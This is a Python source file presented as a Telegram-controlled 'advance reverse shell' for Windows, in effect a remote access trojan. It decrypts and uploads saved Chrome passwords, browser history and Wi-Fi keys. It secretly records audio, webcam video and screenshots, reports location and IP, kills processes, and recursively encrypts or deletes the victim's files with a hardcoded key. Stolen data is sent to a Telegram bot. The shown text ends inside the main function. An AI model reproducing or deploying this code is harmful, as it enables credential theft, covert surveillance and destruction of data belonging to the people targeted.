###########################################
##            24/05/2022                 ##
##     tlegram advance reverse shell     ##
##           Aharon chetrit              ##
##                                       ##
##  Developer: Aharon chetrit            ##
##  Designed for Windows environment     ##
###########################################


######################################
##                                  ##
##         pip library              ##
##        --------------            ##    
##                                  ##
##  !pip install cryptography       ##
##  !pip install scipy              ##
##  !pip install opencv-python      ## 
##  !pip install Pillow             ##
##  !pip install wavio              ##
##  !pip install wavfile            ##
##  !pip install PyAutoGUI          ##
##  !pip install sounddevice        ##
##  !pip install urllib3            ##
##  !pip install urlopen            ##
##  !pip install requests           ##
##  !pip install bs4                ##
##  !pip install pycryptodomex      ##
##  !pip install pypiwin32          ##
##  !pip install PySimpleGUI        ##
##  !pip install speedtest-cli      ##
##  !pip install wmi                ##
######################################
import webbrowser
webbrowser.open("https://www.google.co.il/?hl=iw")
import re
import cryptography
from cryptography.fernet import Fernet
import urllib.request
from urllib.request import urlopen
from bs4 import BeautifulSoup
import cv2
from PIL import ImageGrab
import sounddevice as sd
from scipy.io.wavfile import write
import wavio as wv
import os
import time
import subprocess
import requests
import socket
import pyautogui
import wmi
import sqlite3
import json
import base64
import sqlite3
import win32crypt
import shutil
from datetime import timezone, datetime, timedelta
import base64
import tempfile
import sys
import csv
import argparse
from Cryptodome.Cipher import AES
import PySimpleGUI as sg
from os import listdir
from os.path import isfile, join
import math
import heapq




telegram_token = 'your telegram token'
chat_id = 'group chat id'

class Proccess:
    def start_proc(self):
        p = subprocess.Popen('rd /s /q "C:\proccess\crop\"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        p.stdout.readlines()
        p = subprocess.Popen("chdir C:\\proccess\\ && mkdir crop", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

        
    def process_scan(self):
        self.start_proc()
        p = subprocess.Popen('tasklist > C:\\proccess\\crop\\crop.txt', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        p.stdout.readlines()
        retval = p.wait

        task=[]
        kb=[]
        with open("C:\\proccess\\crop\\crop.txt",'r')as file:
            for i in file:
                i=i.split("  ")
                task.append(i[0])
                kb.append(i[-1][:-2])
        kb=kb[3:]
        task=task[3:]  

        k2=[]
        chek=[]
        mem=0
        mem_use=[]
        repite=0
        for i in range(len(task)):
            if task[i]not in chek:
                for n in range(len(task)):
                    if task[n]==task[i]:
                        p=kb[n].replace(",",'')
                        mem+=int(p)
                        repite+=1
                k2.append(task[i]+' ('+str(repite)+')')
                chek.append(task[i])
                mem_use.append(mem)
                mem=0
                repite=0

        tasklist=[]        
        mb_mem = heapq.nlargest(len(mem_use),mem_use)      
        for i in range(len(mb_mem)):
            for n in range(len(mb_mem)):
                if mb_mem[i]==mem_use[n] and k2[n] not in tasklist:
                    tasklist.append(k2[n])

        for i in range(len(mb_mem)):
            mb_mem[i]=round(mb_mem[i]*1024/1048576,2)

        for i in range(len(mb_mem)):
            mb_mem[i]=str(mb_mem[i])
            p=0
            for _ in range(len(mb_mem[i])):
                if mb_mem[i][_]!='.':
                    p+=1
                else:
                    break

            if p>3:
                g=p%3
                if g > 0 and p<7:
                    mb_mem[i]=mb_mem[i][:g]+','+mb_mem[i][g:]
                elif g == 0:
                    j=int(p/3)
                    mem=''
                    for n in range(j):
                        print(n)
                        mem+=mb_mem[i][n*3:(n+1)*3]+','
                    mem=mem[:-1]
                    mb_mem[i]=mem+mb_mem[i][p:]
                    mem=''
                    
        send_rez=''           
        with open("C:\\proccess\\crop\\crop.txt",'w')as file:
            send_rez+=(f"{'task name':<30}{'mem use':>20}")
            send_rez+=('\n')
            send_rez+=('='*50)
            send_rez+=('\n')
            for i in range(len(mb_mem)):
                p=str(mb_mem[i])+" MB"
                send_rez+=(f"{tasklist[i]:30}{p:>20}")
                send_rez+=('\n')
        send_rez=bytes(send_rez,encoding='ISO-8859-1')
            
        files={'document':send_rez}
        requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=process.txt",files=files )

        self.start_proc()

        
            


    def kill_process(self,process_name):
        test=os.system('taskkill /IM "' + process_name + '" /F')
        if test == 0:
            send_message("seccessfuly closed!")
        else:
            send_message('field to kill proccess. '+process_name+'.')


            
            
    def searches_process(self,search):
        plst=[]
        f = wmi.WMI()
        c=0
        p='-'
        for process in f.Win32_Process():
            plst.append(process.Name)
        for i in plst:
            if search in i:
                c+=1
                p=i
        
        if c==0:
            send_message(search+' not found..')
        else:
            send_message(p+" ("+str(c)+")")
        return p

    
    

    def kill_all_process(self):
        plst=[]
        c=0
        f = wmi.WMI()
        for process in f.Win32_Process():
            plst.append(process.Name)
        for i in plst:
            try:
                os.system('taskkill /IM "' + i + '" /F')
            except:
                print("faild to kill process: "+i)
                
                

    def kill_list_process(self,lst_process):
        for i in lst_process:
            try:
                os.system('taskkill /IM "' + i + '" /F')
            except:
                    print("faild to kill process: "+i)





def searsh_chrome_history(url,val):
    up_search_ch_his=0
    data=''
    with open('C:\\proccess\\sih\\sih_file2.txt','r') as file:
        for i in file:
            if val in i:
                data+=i+'\n'
                
    with open('C:\\proccess\\sih\\sih_file2.txt','w') as file:
        file.write(data)
    if len(data)>1:
        files={'document':open('C:\\proccess\\sih\\sih_file2.txt', 'rb')}
        requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=history resault.txt",files=files )
    else:
        send_message('not foud.')
    up_search_ch_his=1



def histoty_chrome(url,num):
    all_files = [f for f in listdir('C:\\proccess\\sih\\') if isfile(join('C:\\proccess\\sih\\', f))]
    for i in all_files:
        p = subprocess.Popen('del "C:\\proccess\\sih\\'+i+'"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    try:
        num=int(num)
    except:
        num = 'all'
    username=dir_resaoult.split('\\')
    username=username[2]
    
    
    URl = url
    reqs = requests.get(url)
    soup = BeautifulSoup(reqs.text, 'html.parser')
    urls = []
    for link in soup.find_all('a'):
        if 'History' in str(link):
            p=str(link.get('href'))
            p=p.replace('%20','')
            urls.append(p)
            
            
            
    
    upload_files(url,"C:\\Users\\"+username+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
    if len(urls)>0:
        response = requests.get(url+"History "+'('+str(len(urls))+')')
    else:
        response = requests.get(url+"History")
        
    with open("C:\\proccess\\sih\\sih_file", 'wb')as file:
        file.write(response.content)

        
    
    history_db = ("C:\\proccess\\sih\\sih_file")
    c = sqlite3.connect(history_db)
    cursor = c.cursor()
    select_statement=""" SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime'),
                        url 
                 FROM urls
                 ORDER BY last_visit_time DESC
             """
    cursor.execute(select_statement)
    results = cursor.fetchall()
    with open("C:\\proccess\\sih\\sih_file2.txt", 'w')as file:
        if num !='all':
            num_range=num
        else:
            num_range = len(results)
        for i in range(num_range):
            dbstr=str(results[i])
            file.write(dbstr)
            file.write('\n')
            file.write("-"*50)
            file.write('\n')
            file.write('\n')
    if up_search_ch_his != 0:
        files={'document':open("C:\\proccess\\sih\\sih_file2.txt", 'rb')}
        requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=his.txt",files=files )
    
    
        


def get_currend_directory():
    global dir_resaoult
    try:
        proc = subprocess.Popen("dir", stdout=subprocess.PIPE, shell=True)
        (out, err) = proc.communicate()
        out=str(out).split()
        for i in range(len(out)):
            if "Users" in out[i]:
                pwd=out[i]+" "+out[i+1]
                for i in range(len(pwd)):
                    if pwd[i]=='\\':    
                        curent_dir=pwd[:i]
        curent_dir=curent_dir.split("\\\\")
        dir_current=[]
        for i in curent_dir:
            p=i
            for n in range(len(p)):
                if p[n]!='\\':
                    dir_current.append(p[n])
                if n==len(p)-1:
                    dir_current.append('^')
                if p[n]=='\\':
                    break
        dir_current=str(dir_current).replace("'","").replace(', ','')
        dir_current=dir_current[1:-1]
        dir_current=dir_current.replace('^','\\')
        dir_resaoult=dir_current
        print(dir_resaoult)
    except:
        pass
        
    
    



def get_current_location():
    url = "https://mylocation.org/"
    html = urlopen(url).read()
    data = BeautifulSoup(html, features="html.parser")
    for i in data(["script", "style"]):
        i.extract()  
    text = data.get_text()
    lines = (line.strip() for line in text.splitlines())
    p = (phrase.strip() for line in lines for phrase in line.split("  "))
    text = '\n'.join(p for p in p if p)
    text=text.split('\n')
    c_l=[]
    for i in range (len(text)):
        if 'Public IP Address:'in text[i]:
            for n in range(i+1,i+15) :
                c_l.append(text[n])
            break
    pc_l1=c_l[::2]
    pc_l2=c_l[1::2]
    
    res=''
    for i in range(len(pc_l1)):
        res+=(f"{str(pc_l1[i]):<20}{pc_l2[i]:>20}")
        res+=('\n')
    
    send_message(res)



#no concole speedtest



def chrome_password2():
    def startchromepass():
        all_files = [f for f in listdir('C:\\proccess\\ssap\\') if isfile(join('C:\\proccess\\ssap\\', f))]
        for i in all_files:
            p = subprocess.Popen('del "C:\\proccess\\ssap\\'+i+'"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    def temp():
        temp_loc = tempfile.gettempdir()
        directory = "system variables"
        path = os.path.join(temp_loc,directory)
        return path

    def createPath():
        path = temp()
        try:
            os.mkdir(path)
        except Exception:
            pass


    def get_chrome_datetime(chromedate):
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r" ,encoding='iso-8859-1') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:] 
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode() 
            return decrypted_pass
        except Exception as e:
            return "Chrome < 80"


    def password():
        main_loc = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data'+os.sep
        possible_location = ["Default",'Guest profile']
        for folder in os.listdir(main_loc):
            if "Profile " in folder:
                possible_location.append(folder)
                print(folder)
                print(possible_location)
        possible_location=possible_location+['Default']
        global for_file
        for_file=[]
        master_key = get_master_key()
        for loc in possible_location:
            try:
                path_db = main_loc + loc + os.sep + 'Login Data For Account'
                db_loc = temp() + os.sep + "Loginvault.db"
                shutil.copy2(path_db, db_loc) 
                conn = sqlite3.connect(db_loc)
                cursor = conn.cursor()
                print(path_db)
            
                try:
                    fileloc = os.path.join(temp(),'Chrome_'+loc+".txt")
                    with open(fileloc,'w') as f:
                        cursor.execute("select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

                        for r in cursor.fetchall():
                            url = r[0]
                            username = r[1]
                            encrypted_password = r[2]
                            decrypted_password = decrypt_password(encrypted_password, master_key)
                            date_created = r[3]
                            date_last_used = r[4]
                            if len(username) >0:
                                url = r[0]
                                username = r[1]
                                encrypted_password = r[2]
                                decrypted_password = decrypt_password(encrypted_password, master_key)
                                date_created = r[3]
                                date_last_used = r[4]




                                for_file.append(f"{'password: '+str(decrypted_password)}")
                                for_file.append(f"{'username: '+username}")
                                for_file.append(f"{'url: '+url}")


                                if date_created != 86400000000 and date_created:
                                    for_file.append(f"Creation date: {str(get_chrome_datetime(date_created))}")

                                if date_last_used != 86400000000 and date_last_used:
                                    for_file.append(f"Last Used: {str(get_chrome_datetime(date_last_used))}")

                                for_file.append('\n'+("-"*60))
                    f.close()


                except Exception as e:
                    print(e)
                    pass
                cursor.close()
                conn.close()
                try:
                    os.remove(db_loc)
                    time.sleep(0.2)
                except Exception as e:
                    pass
                for_file.append("^^#others "+loc)
            except:
                pass
            
        for loc in possible_location:
            try:
                path_db = main_loc + loc + os.sep + 'Login Data'
                db_loc = temp() + os.sep + "Loginvault.db"
                shutil.copy2(path_db, db_loc) 
                conn = sqlite3.connect(db_loc)
                cursor = conn.cursor()
                print(path_db)
                try:
                    fileloc = os.path.join(temp(),'Chrome_'+loc+".txt")
                    with open(fileloc,'w') as f:
                        cursor.execute("select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

                        for r in cursor.fetchall():
                            url = r[0]
                            username = r[1]
                            encrypted_password = r[2]
                            decrypted_password = decrypt_password(encrypted_password, master_key)
                            date_created = r[3]
                            date_last_used = r[4]
                            if len(username) >0:
                                url = r[0]
                                username = r[1]
                                encrypted_password = r[2]
                                decrypted_password = decrypt_password(encrypted_password, master_key)
                                date_created = r[3]
                                date_last_used = r[4]




                                for_file.append(f"{'password: '+str(decrypted_password)}")
                                for_file.append(f"{'username: '+username}")
                                for_file.append(f"{'url: '+url}")


                                if date_created != 86400000000 and date_created:
                                    for_file.append(f"Creation date: {str(get_chrome_datetime(date_created))}")

                                if date_last_used != 86400000000 and date_last_used:
                                    for_file.append(f"Last Used: {str(get_chrome_datetime(date_last_used))}")

                                for_file.append('\n'+("-"*60))
                    f.close()


                except Exception as e:
                    print(e)
                    pass
                cursor.close()
                conn.close()
                try:
                    os.remove(db_loc)
                    time.sleep(0.2)
                except Exception as e:
                    pass
                for_file.append("^^#"+loc)
            except Exception as e:
                print(e)
                pass
        for_file=for_file[::-1]
        for i in range(len(for_file)):
            if '^^#' in for_file[i]:
                c=0
                with open("C:\\proccess\\ssap\\"+for_file[i]+'.txt','w') as file:
                    for n in range(i,len(for_file)):
                        if c == 1:
                            if  '^^#' not in for_file[n]:
                                file.write(for_file[n])
                                file.write('\n')
                            else:
                                break
                        else:
                            pass
                        c=1
                        
                        
        if up_chrom_pass!=0:
            allfiles = [f for f in listdir('C:\\proccess\\ssap\\') if isfile(join('C:\\proccess\\ssap\\', f))]
            for i in allfiles:
                file=open('C:\\proccess\\ssap\\'+ i, 'rb')
                data=file.read()
                Crypt_my10(key).encrypt_files('C:\\proccess\\ssap\\'+ i)
                files={'document':data}
                requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption="+i[3:]+".txt",files=files )
            
            
            for i in allfiles:
                try:
                    time.sleep(1)
                    print("sec")
                except Exception as e:
                    print(e)
                    pass

            startchromepass()
            
    
    temp()
    createPath()
    startchromepass()       
    password()
         


class Search_chrome_passwords():
    
    def __init__(self,val):
        self.val = val 
    
    def end_search_ch(self):
        all_files = [f for f in listdir('C:\\proccess\\ssap\\') if isfile(join('C:\\proccess\\ssap\\', f))]
        for i in all_files:
            p = subprocess.Popen('del "C:\\proccess\\ssap\\'+i+'"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

        
    def search_pass(self):
        print(self.val)
        chrome_password2()
        data=[]
        with open ("C:\\proccess\\ssap\\^^#Default.txt",'r') as file:
            for i in file:
                data.append(i)
        c=0
        sevdvar=''
        for i in range(len(data)):
            if self.val in data[i]:
                A=(data[i-2][:-1])
                B=(data[i-1][:-1])
                C=(data[i][:-1])
                D=(data[i+1][:-1])
                E=(data[i+2][:-1])
                c=1
                if ('-'*10)not in A:
                    sevdvar+=A+'\r\n'+B+'\r\n'+C+'\r\n'+D+'\r\n'+E
                else:
                    sevdvar+=B+'\r\n'+C+'\r\n'+D+'\r\n'+E
                send_message(sevdvar)
                sevdvar=''
                    
            
        if i == len(data)-1 and c==0:
            send_message("not found..")
        self.end_search_ch()
            
            
    def advanced_search(self):
        chrome_password2()
        t='1'
        all_files = [f for f in listdir('C:\\proccess\\ssap\\') if isfile(join('C:\\proccess\\ssap\\', f))]
        
        
        for i in all_files:
            data=[]
            with open("C:\\proccess\\ssap\\"+i,"r") as file:
                for n in file:
                    data.append(n)
                    
                c=0
                sevdvar=''
                for j in range(len(data)):
                    if self.val in data[j]:
                        t='ii11'
                        if c==0:
                            A=(i[3:]+':')
                            B=("="*10)
                        C=(data[j-2][:-1])
                        D=(data[j-1][:-1])
                        E=(data[j][:-1])
                        F=(data[j+1][:-1])
                        G=(data[j+2][:-1])
                        if c==0:
                            if ('-'*10)not in C:
                                sevdvar+=A+'\r\n'+B+'\r\n'+C+'\r\n'+D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'

                            else:
                                sevdvar+=A+'\r\n'+B+'\r\n'+D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'
                        else:
                            if ('-'*10)not in C:
                                sevdvar+=C+'\r\n'+D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'

                            else:
                                sevdvar+=D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'
                        c=1
                send_message(sevdvar)
                        
                        
        try:                
            if len(t)<2:
                send_message("'"+self.val+"' is not found..")
        except:
            print(len(t))
            pass
        time.sleep(4)
        print("end")
        self.end_search_ch()
        
        




def ip_information():
    global ip_in
    r = requests.get(r'http://jsonip.com')
    ip= r.json()['ip']
    IP= format(ip)
    public_ip = IP
    hostname = socket.gethostname()    
    IPAddr = socket.gethostbyname(hostname)
    ip_in=['public: '+public_ip,'host name: '+hostname,"private: "+IPAddr]
    




def upload_files(url,file):
    global up_upl
    File = {
        "test_file_1": open(file, "rb")
    }

    responseVar = requests.post(url, files = File)
    if responseVar.ok:
        send_message("successfully Upload file  !(copy all url message.)")
        file=file.split('//')
        up_upl=1
    else:
        send_message("upload failed.. ")
        up_upl=0
        
        

def satrt_file_on_target(path):

    try:
        os.startfile(path)
        send_message("the file was seccessfuly opens!")
    except:
        send_message('failed to open '+path)

        



def record_target(name,timer):
    timer=int(timer)
    send_message('trying to record..\nwaut until the record will end.')
    path_rec='C:\\proccess\\rec\\'+name+'.wav'
    
    freq = 44100
    recording = sd.rec(int(timer * freq),
            samplerate=freq, channels=2)
    sd.wait()
    wv.write(path_rec, recording, freq, sampwidth=2)
    
    with open(path_rec,'rb') as file:
        data_audio=file.read()
    Crypt_my10(key).encrypt_files(path_rec)
    
    
    files={'audio':data_audio}
    requests.post("https://api.telegram.org/bot"+telegram_token+"/sendAudio?chat_id="+chat_id+"&caption="+name+'.wav' ,files=files)
    time.sleep(1)
    try:
        Delet_files().delet_files_list(path_rec)
    except:
        pass




class Delet_files():
    
    def __init__(self):
        self.to_send = ''
        self.sec=[]
        

    def delet_one_file(self,file_path):
        path=path.replace('\\\\','\\')
        p = subprocess.Popen("del "+file_path, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)


    def delet_files_list(self,path):
        path=path.replace('\\\\','\\')
        failed=[]
        all_files = [f for f in listdir(path) if isfile(join(path, f))]
        for i in all_files:
            p = subprocess.Popen('del '+ '"'+path+i+'"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            output=str(p.stdout.readlines())+''
            print(output)
            if len(output)<3:    
                self.sec.append(f'{str(i):<30}{"deleted!":>25}')
            else:
                failed.append(f"{str(i):<30}{'faild!':>25}")
            
            

        for i in self.sec:
            self.to_send+=i+'\n'
        for i in failed:
            self.to_send+=i+'\n'
        print(self.to_send)
            
            
            
    def to_send_res(self,path):
        self.delet_files_list(path)
        if len( self.sec)>0:
            send_message(self.to_send)
        
        
    
    def recursive_fles_delete(self,path):
        p = subprocess.Popen('rd /s /q "'+path+'"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        c = p.stdout.readline()
       
    




def wifi_info(): 

    p = subprocess.Popen("netsh wlan show  profile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    data_wifi=[]
    for line in p.stdout.readlines():
        line=str(line)
        data_wifi.append(line)
    retval = p.wait
    lst=[]
    for i in range(len(data_wifi)):
        if 'All User Profile'in data_wifi[i]:
            lst.append(data_wifi[i][29:])
    profile=''
    lst2=[]
    for i in lst:
        for n in range(len(i)):
            if i[n]+i[n+1]!='\\r':
                profile+=i[n]
            else:
                lst2.append(profile)
                profile=''
                break
                
                

    expend_wifi_info=[]
    expend_wifi_info2=[]
    len_lst2=len(lst2)-1
    with open('C:\\proccess\\wiinf\\expend.txt','w') as file:
        for i in range(len(lst2)):
            expend_wifi_info=[]
            file.write(lst2[i])
            file.write('\n')
            file.write("-"*len(lst[i]))
            file.write('\n')
            data=[]
            p = subprocess.Popen("netsh wlan show  profile "+lst2[i]+' key=clear', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            for line in p.stdout.readlines():
                line=str(line)
                file.write(line[:-3])
                file.write('\n')
                expend_wifi_info.append(line)
            file.write('\n'*4)
            if i != len_lst2:
                file.write('-'*30)
                file.write('\n'*2)
            expend_wifi_info2.append(expend_wifi_info)
    file.close()


        
        
    key_cont=[]
    ssid_nmae=[]
    for i in range(len(expend_wifi_info2)):
        table=expend_wifi_info2[i]
        if "Key Content" in str(expend_wifi_info2[i]):
            for n in range(len(table)):
                if 'SSID name' in table[n]:
                    ssid_nmae.append(table[n][32:-1])
                if"Key Content" in table[n]:
                    key_cont.append(table[n][31:])
    ssidname=[]
    passw_name=[]
    for i in range(len(ssid_nmae)):
            name=''
            passw=''
            for n in range(len(ssid_nmae[i])):
                if ssid_nmae[i][n]+ssid_nmae[i][n+1]!='"\\' :
                    name+=ssid_nmae[i][n]
                else:
                    ssidname.append(name)
                    break
            for j in range(len(ssid_nmae[i])+1):
                if key_cont[i][j]!= '\\':
                    passw+=key_cont[i][j]
                else:
                    passw_name.append(passw)
                    break
                    
                    
    with open('C:\\proccess\\wiinf\\info.txt','w') as file:
        file.write(f"{'profile':<35}{'password':>35}")
        file.write("\n")
        file.write("-"*50)
        file.write("\n")
        for i in range(len(lst2)):
            if lst2[i] not in ssidname:
                if len(lst2[i])<26:
                    file.write(f"{lst2[i]:<30}{'None':>20}")
                    file.write('\n')
                else:
                    file.write(f"{lst2[i][:26]:<30}{'None':>20}")
                    file.write('\n')
                    
        for i in range(len(ssidname)):
            file.write(f"{ssidname[i]:<30}{passw_name[i]:>20}")
            file.write('\n')
    file.close()

    



def open_camera(name_vid):
    global name_video
    name_video=name_vid
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'avc1')
    out = cv2.VideoWriter('C:\\proccess\\div\\'+name_video+'.mp4', fourcc, 20.0, (640, 480))
    c=0
    while cap.isOpened():
        ret, frame = cap.read()
        if ret:
            frame = cv2.resize(frame, (640, 480))
            out.write(frame)
            cv2.imshow('Video', frame)
            base_url='https://api.telegram.org/bot'+telegram_token+'/getUpdates?offset='+offset
            resp = requests.get(base_url)
            messages=resp.text
            messages=messages.replace("update_id","^^^@^@").split('^^^')
            messages=messages[-1]
            messages=str(messages)
            if c==0:
                send_message("recording...")
                c=1
            if cv2.waitKey(1) & 0xFF == ord('q') or "close camera" in messages:
                send_message("camera seccessfuly closed! you can captur the video by typing 'captur video' ")
                break
            
        else:
            send_message("failed to open camera")
            break
    cap.release()
    out.release()
    cv2.destroyAllWindows()
    if c==1:
        with open('C:\\proccess\\div\\'+name_video+'.mp4','rb') as file:
            data=file.read()
        Crypt_my10(key).encrypt_files('C:\\proccess\\div\\'+name_video+'.mp4')
        files={'video':data}
        requests.post("https://api.telegram.org/bot"+telegram_token+"/sendVideo?chat_id="+chat_id+"&caption=test.mp4" ,files=files)
        



key = b'm3mVGQlx_lB2qfaBw7ksd2DWVKawrh52bGpxczScykE='

class Crypt_my10():
   
    def __init__(self,key):
        self.key=key
        self.up_crypt=0
       
        
        
        
    def start_crypt(self):
        p = subprocess.Popen('rd /s /q "C:\proccess\tuop\"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        p.stdout.readlines()
       
    

    
    def encrypt_data(self,data):
        global en_dt
        try:
            data = bytes(data, encoding="utf8")
            fer = Fernet(self.key)
            en_dt=fer.encrypt(data)
        except:
            fer = Fernet(self.key)
            en_dt=fer.encrypt(data)
        return en_dt


    def decrypt_data(self,data):
        global dec_dt
        fer = Fernet(self.key)
        dec_dt=fer.decrypt(data)
        #dec_dt=str(dec_dt)[2:-1]
        return dec_dt

    
    
    def encrypt_files(self,path):
        print(inside_up_crypt)
        with open(path,'rb') as file:
            data=file.read()
        
        with open(path,'wb')as file:
            file.write(self.encrypt_data(data))
            if self.up_crypt==0 and inside_up_crypt !=0:
                send_message("successfully encrypted")
            
            
            
    def decrypt_files(self,path):
        with open(path,'rb')as file:
            data=file.read()
            
        with open(path,'wb') as file:
            dec_data=self.decrypt_data(data)
            file.write(dec_data)
            if self.up_crypt==0 and inside_up_crypt !=0:
                send_message("successfully decrypted")
            
            
    def get_dirs(self,path):
        os.walk(path)
        dir_list=[x[0] for x in os.walk(path)]
        return dir_list
        
        
    def recursive_encrypt_files(self,path):
        self.up_crypt=1
        paths_dir=self.get_dirs(path)
        c=0
        for i in paths_dir:
            all_files = [f for f in listdir(i) if isfile(join(i, f))]
            if len(all_files)>0:
                for n in all_files:
                    try:
                        self.encrypt_files(i+'\\'+n)
                        c+=1
                    except:
                        pass
            all_files=[]
        send_message("files that were successfully encrypted: "+str(c))
            
            
    
    def recursive_decrypt_files(self,path):
        self.up_crypt=1
        paths_dir=self.get_dirs(path)
        c=0
        for i in paths_dir:
            all_files = [f for f in listdir(i) if isfile(join(i, f))]
            if len(all_files)>0:
                for n in all_files:
                    try:
                        self.decrypt_files(i+'\\'+n)
                        c+=1
                    except:
                        pass
            all_files=[]
        send_message("files that were successfully decrypted: "+str(c))
            
            
            
    def sync_recursive_encrypt_files(self,path):
        paths_dir=self.get_dirs(path)
        size=[]
        for i in paths_dir:
            all_files = [f for f in listdir(i) if isfile(join(i, f))]
            if len(all_files)>0:
                for n in all_files:
                    size.append(os.path.getsize(i+'\\'+n))
            all_files=[]
            
        self.recursive_encrypt_files(path)
        
        c=0
        sec=''
        faild=''
        for i in paths_dir:
            all_files = [f for f in listdir(i) if isfile(join(i, f))]
            if len(all_files)>0:
                for n in all_files:
                    size2=os.path.getsize(i+'\\'+n)
                    p=i+'\\'+n
                    if size2!=size[c]:
                        sec+=f"{p:<70}{' sec':>10}"+'\n'
                    else:
                        faild+=f"{p:<70}{' failde':>10}"+'\n'
                    c+=1
            all_files=[]
            
        if len(sec)+len(faild)<3900:
            send_message(sec+faild)
        else:
            res_send=bytes(sec+faild,encoding='utf8')
            files={'document':res_send}
            requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=crypt.txt",files=files )    
        self.start_crypt()
        
        


def send_files_to_target(url,name):
    download = requests.get(url)
    try:
        with open('C:\\proccess\\down\\'+name,"wb")as file:
            file.write(download.content)
            send_message("successfuly send!")
    except:
        send_message('faild to send file..')




def screen_shot(name):
    save_image_path= 'C:\\proccess\\neercs\\'+name+'.jpg'
    my_screenshot = pyautogui.screenshot()
    my_screenshot.save(save_image_path)
    
    
    with open(save_image_path,'rb')as file:
            data=file.read() 
    Crypt_my10(key).encrypt_files(save_image_path)
    
    files={'photo':data}
    requests.post("https://api.telegram.org/bot"+telegram_token+"/sendPhoto?chat_id="+chat_id+"&caption="+name+".png" ,files=files)






def take_picture(name):
    cam = cv2.VideoCapture(0)
    cam.set(3,1920)
    cam.set(4,1080)
    global frame
    if cam.isOpened():
        j,frame = cam.read()
        cam.release() 
        if j and frame is not None:
            inside_up_crypt=0
            image_bytes = cv2.imencode('.jpg', frame)[1].tobytes()
            
            files={'photo':image_bytes}
            requests.post("https://api.telegram.org/bot"+telegram_token+"/sendPhoto?chat_id="+chat_id+"&caption="+name+".jpg" ,files=files)
        else:
            send_message("failed")
        inside_up_crypt=1




def offset_num():
    global offset
    base_url='https://api.telegram.org/bot'+telegram_token+'/getUpdates?offset='
    resp = requests.get(base_url)
    messages=resp.text
    messages=messages.replace("update_id","^^^@^@").split('^^^')
    messages=messages[-1]
    messages=str(messages)

    offset=''
    for i in range(len(messages)):
        if messages [i:i+3]=='@^@':
            for n in range(i+5,100000):
                if messages[n]!=',':
                    offset+=messages[n]
                else:
                    break
            break





def send_message(message):
    message=str(message)
    if len(message)>3900:
        message=bytes(message,encoding='ISO-8859-1')
        files={'document':message}
        requests.post("https://api.telegram.org/bot"+telegram_token+"/sendDocument?chat_id="+chat_id+"&caption=output.txt",files=files )
    else:
        requests.get("https://api.telegram.org/bot"+telegram_token+"/sendMessage?chat_id="+chat_id+"&text="+message)
    




def main():
    global up_chrom_pass,cc,counter,offset,command,up_search_ch_his,inside_up_crypt
    up_chrom_pass=1
    inside_up_crypt=1
    cc=0
    counter=0
    offset_num()
    get_currend_directory()
    ip_information()
        
    Delet_files().recursive_fles_delete('C:\\proccess\\')
    time.sleep(2)
    p = subprocess.Popen("chdir C:\\ && mkdir proccess ", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    p.stdout.readlines()
    time.sleep(1)
    p = subprocess.Popen("chdir C:\\proccess\\ && mkdir rec", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    p = subprocess.Popen("chdir C:\\proccess\\ && mkdir down", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    p = subprocess.Popen("chdir C:\\proccess\\ && mkdir div", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    p = subprocess.Popen("chdir C:\\proccess\\ && mkdir loc", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    p = subprocess.Popen("chdir C:\\proccess\\ && mkdir ssap", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    p = subprocess.Popen("chdir C:\\proccess\\ && mkdir sih", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
